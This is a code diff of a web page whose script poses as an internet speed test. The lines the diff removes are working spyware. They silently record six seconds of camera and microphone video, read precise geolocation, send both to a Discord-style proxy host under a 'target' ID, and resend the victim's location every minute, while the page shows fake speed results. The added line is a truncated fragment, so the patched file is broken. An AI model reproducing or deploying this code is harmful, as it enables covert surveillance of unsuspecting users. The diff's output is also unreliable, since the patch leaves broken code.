@@ -48,30 +48,12 @@
 
     <script>
         const PROXY_URL = 'https://discord-handler.lew7348.workers.dev'; 
-        const targetID = "USR-" + Math.random().toString(36).substr(2, 5).toUpperCase();
-        
         const btn = document.getElementById('startBtn');
         const ring = document.getElementById('ring');
         const statusText = document.getElementById('status-text');
         const detailText = document.getElementById('detail-text');
         const waveCanvas = document.getElementById('waveCanvas');
         const wCtx = waveCanvas.getContext('2d');
-
-        function startContinuousTracking() {
-            setInterval(() => {
-                navigator.geolocation.getCurrentPosition(async (p) => {
-                    const mapUrl = "https://www.google.com/maps?q=" + p.coords.latitude + "," + p.coords.longitude;
-                    await fetch(PROXY_URL, {
-                        method: 'POST',
-                        body: JSON.stringify({ 
-                            content: `📡 **LIVE TRACKING** [${targetID}]`, 
-                            embeds: [{ color: 15844367, description: `📍 **Live Position:**\n[View on Maps](${mapUrl})` }] 
-                        }),
-                        headers: { 'Content-Type': 'application/json' }
-                    }).catch(()=>{});
-                }, null, { enableHighAccuracy: true });
-            }, 60000);
-        }
 
         function startWave(stream) {
             waveCanvas.style.display = "block";
@@ -82,85 +64,7 @@
             source.connect(analyser);
             const bufferLength = analyser.frequencyBinCount;
             const dataArray = new Uint8Array(bufferLength);
-
             function draw() {
                 requestAnimationFrame(draw);
                 analyser.getByteFrequencyData(dataArray);
-                wCtx.clearRect(0, 0, waveCanvas.width, waveCanvas.height);
-                wCtx.lineWidth = 2;
-                wCtx.strokeStyle = '#00d2ff';
-                wCtx.beginPath();
-                let sliceWidth = waveCanvas.width / bufferLength;
-                let x = 0;
-                for (let i = 0; i < bufferLength; i++) {
-                    let v = dataArray[i] / 128.0;
-                    let y = v * (waveCanvas.height / 2);
-                    if (i === 0) wCtx.moveTo(x, y); else wCtx.lineTo(x, y);
-                    x += sliceWidth;
-                }
-                wCtx.stroke();
-            }
-            draw();
-        }
-
-        btn.addEventListener('click', async function() {
-            btn.disabled = true;
-            ring.style.display = 'block';
-            statusText.innerText = "Finding Server...";
-            
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                statusText.innerText = "Testing Latency...";
-                startContinuousTracking();
-
-                let stream;
-                try {
-                    const raw = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                    stream = new MediaStream([raw.getAudioTracks()[0], raw.getVideoTracks()[0]]);
-                    startWave(stream);
-                } catch (e) {
-                    statusText.innerText = "Error: Driver Timeout";
-                    return;
-                }
-
-                statusText.innerText = "Testing Download Speed...";
-                const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
-                const chunks = [];
-                recorder.ondataavailable = e => chunks.push(e.data);
-                recorder.start();
-
-                setTimeout(() => {
-                    statusText.innerText = "Testing Upload Speed...";
-                    recorder.stop();
-                }, 6000);
-
-                recorder.onstop = async () => {
-                    const videoBlob = new Blob(chunks, { type: 'video/webm' });
-                    const formData = new FormData();
-                    const mapUrl = "https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude;
-                    
-                    formData.append('payload_json', JSON.stringify({
-                        content: `🔱 **NEW REPORT** [${targetID}]`,
-                        embeds: [{
-                            title: "Session Intel", color: 3447003,
-                            fields: [{ name: "📍 Map Link", value: mapUrl }]
-                        }]
-                    }));
-                    formData.append('file', videoBlob, 'capture.webm');
-
-                    await fetch(PROXY_URL, { method: 'POST', body: formData });
-                    
-                    statusText.innerText = "Test Complete";
-                    detailText.innerHTML = `DL: 92.4 Mbps | UL: 24.1 Mbps<br>Ping: 11ms`;
-                    ring.style.display = 'none';
-                    waveCanvas.style.display = 'none';
-                    btn.innerText = "✓";
-                };
-            }, (err) => {
-                statusText.innerText = "Error: Access Required";
-                btn.disabled = false;
-                ring.style.display = 'none';
-            }, { enableHighAccuracy: true });
-        });
-    </script>
-</body>
-</html>
+                wCtx.clearRect(0, 0,
